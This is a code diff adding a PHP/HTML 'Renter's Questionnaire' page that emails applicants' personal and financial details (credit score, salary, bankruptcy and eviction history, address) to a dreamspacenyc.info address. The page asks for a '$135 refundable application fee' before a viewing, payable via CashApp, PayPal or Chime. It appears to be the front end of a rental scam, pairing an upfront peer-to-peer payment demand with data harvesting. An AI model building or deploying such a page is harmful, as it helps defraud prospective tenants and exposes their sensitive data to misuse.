@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Renter's Questionnaire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #333;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #444;
+            padding: 20px;
+            border-radius: 8px;
+            width: 400px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
+        }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="number"], input[type="date"], select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: none;
+        }
+        input[type="radio"], input[type="checkbox"] {
+            margin-right: 10px;
+        }
+        .radio-group, .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #888;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        .message {
+            margin-top: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Renter’s Questionnaire</h1>
+
+        <?php
+        if ($_SERVER["REQUEST_METHOD"] == "POST") {
+            // Collect form data
+            $formData = "";
+            foreach ($_POST as $key => $value) {
+                if (is_array($value)) {
+                    $value = implode(", ", $value);
+                }
+                $formData .= "<p><strong>" . ucfirst(str_replace("-", " ", $key)) . ":</strong> " . htmlspecialchars($value) . "</p>";
+            }
+
+            // Email details
+            $to = "applications@dreamspacenyc.info";
+            $subject = "New Renter's Questionnaire Submission";
+            $headers = "From: no-reply@dreamspacenyc.info\r\n";
+            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
+
+            // Email content
+            $message = "
+            <html>
+            <body>
+            <h2>New Renter's Questionnaire Submission</h2>
+            $formData
+            </body>
+            </html>";
+
+            // Send email
+            if (mail($to, $subject, $message, $headers)) {
+                echo "<div class='message'>Thank you! Your submission has been received.</div>";
+            } else {
+                echo "<div class='message'>Oops! Something went wrong, please try again.</div>";
+            }
+        }
+        ?>
+
+        <form action="" method="post">
+            <label for="first-name">Full Name:</label>
+            <input type="text" id="first-name" name="first-name" placeholder="First Name" required>
+            <input type="text" id="last-name" name="last-name" placeholder="Last Name" required>
+
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" name="email" placeholder="example@example.com" required>
+
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" placeholder="(000) 000-0000" required>
+
+            <label for="address">Current Address:</label>
+            <input type="text" id="address" name="address" placeholder="Street Address" required>
+            <input type="text" id="city" name="city" placeholder="City" required>
+            <input type="text" id="state" name="state" placeholder="State" required>
+            <select id="country" name="country" required>
+                <option value="" disabled selected>Country</option>
+                <option value="usa">USA</option>
+                <option value="canada">Canada</option>
+                <option value="uk">UK</option>
+                <!-- Add more countries as needed -->
+            </select>
+
+            <label for="credit-score">What's your credit score?</label>
+            <input type="number" id="credit-score" name="credit-score" required>
+
+            <label>Are you currently employed?</label>
+            <div class="radio-group">
+                <input type="radio" id="employed-yes" name="employed" value="yes" required>
+                <label for="employed-yes">Yes</label>
+                <input type="radio" id="employed-no" name="employed" value="no">
+                <label for="employed-no">No</label>
+            </div>
+
+            <label for="salary">Monthly Salary (USD):</label>
+            <input type="number" id="salary" name="salary" required>
+
+            <label>Do you have pets?</label>
+            <div class="radio-group">
+                <input type="radio" id="pets-yes" name="pets" value="yes" required>
+                <label for="pets-yes">Yes</label>
+                <input type="radio" id="pets-no" name="pets" value="no">
+                <label for="pets-no">No</label>
+            </div>
+
+            <label>Have you ever declared bankruptcy?</label>
+            <div class="radio-group">
+                <input type="radio" id="bankruptcy-yes" name="bankruptcy" value="yes" required>
+                <label for="bankruptcy-yes">Yes</label>
+                <input type="radio" id="bankruptcy-no" name="bankruptcy" value="no">
+                <label for="bankruptcy-no">No</label>
+                <input type="radio" id="bankruptcy-other" name="bankruptcy" value="other">
+                <label for="bankruptcy-other">Other</label>
+            </div>
+
+            <label>Have you ever been evicted?</label>
+            <div class="radio-group">
+                <input type="radio" id="evicted-yes" name="evicted" value="yes" required>
+                <label for="evicted-yes">Yes</label>
+                <input type="radio" id="evicted-no" name="evicted" value="no">
+                <label for="evicted-no">No</label>
+            </div>
+
+            <label for="viewing-date">Choose your viewing date:</label>
+            <input type="date" id="viewing-date" name="viewing-date" required>
+
+            <p>You are required to pay a refundable application fee of $135. Most importantly please know that the application fee is refundable if you don’t wish to continue upon viewing; and if you happen to like it, it will be deducted from the first month rent.</p>
+
+            <label for="payment-method">Preferred Payment Method:</label>
+            <div class="checkbox-group">
+                <input type="checkbox" id="cashapp" name="payment-method[]" value="CASHAPP">
+                <label for="cashapp">CASHAPP</label>
+                <input type="checkbox" id="paypal" name="payment-method[]" value="PAYPAL">
+                <label for="paypal">PAYPAL</label>
+                <input type="checkbox" id="chime" name="payment-method[]" value="CHIME">
+                <label for="chime">CHIME</label>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="terms" name="terms" required>
+                <label for="terms">I agree to <a href="#">terms & conditions</a>.</label>
+            </div>
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
